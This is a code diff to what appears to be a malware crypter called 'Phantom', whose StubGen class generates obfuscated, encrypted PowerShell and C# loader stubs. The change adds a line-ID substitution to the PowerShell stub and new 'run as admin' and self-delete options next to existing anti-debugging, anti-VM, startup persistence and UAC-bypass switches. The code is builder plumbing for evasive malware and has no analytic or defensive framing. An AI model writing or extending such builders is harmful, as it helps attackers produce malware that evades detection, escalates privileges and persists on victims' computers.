@@ -9,7 +9,7 @@ namespace Phantom
     internal class StubGen
     {
         // Method to create PowerShell script
-        internal static string CreatePS(byte[] key, byte[] iv, EncryptionMode mode, Random rng)
+        internal static string CreatePS(byte[] key, byte[] iv, EncryptionMode mode, string ContentLineID, Random rng)
         {
             // Declare variables
             string stubcode = string.Empty;
@@ -48,6 +48,7 @@ namespace Phantom
                                .Replace(@"gs_var", gsVar)
                                .Replace(@"obfstep1_var", obfStep1Var)
                                .Replace(@"obfstep2_var", obfStep2Var)
+                               .Replace(@":: ", ContentLineID)
                                .Replace(Environment.NewLine, string.Empty);
 
             // Return the generated PowerShell script
@@ -55,7 +56,7 @@ namespace Phantom
         }
 
         // Method to create C# stub code
-        internal static string CreateCS(byte[] key, byte[] iv, EncryptionMode mode, bool antidebug, bool antivm, bool startup, bool uacbypass, bool native, Random rng)
+        internal static string CreateCS(byte[] key, byte[] iv, EncryptionMode mode, bool antidebug, bool antivm, bool startup, bool uacbypass, bool runas, bool selfDelete, bool native, Random rng)
         {
             // Declare variables
             string namespacename = RandomString(20, rng);
@@ -87,6 +88,15 @@ namespace Phantom
             if (uacbypass)
             {
                 stub += "#define UAC_BYPASS\n";
+            }
+
+            if (runas)
+            {
+                stub += "#define RUNAS_ADMIN\n";
+            }
+            if (selfDelete)
+            {
+                stub += "#define SELF_DELETE\n";
             }
             if (native)
             {
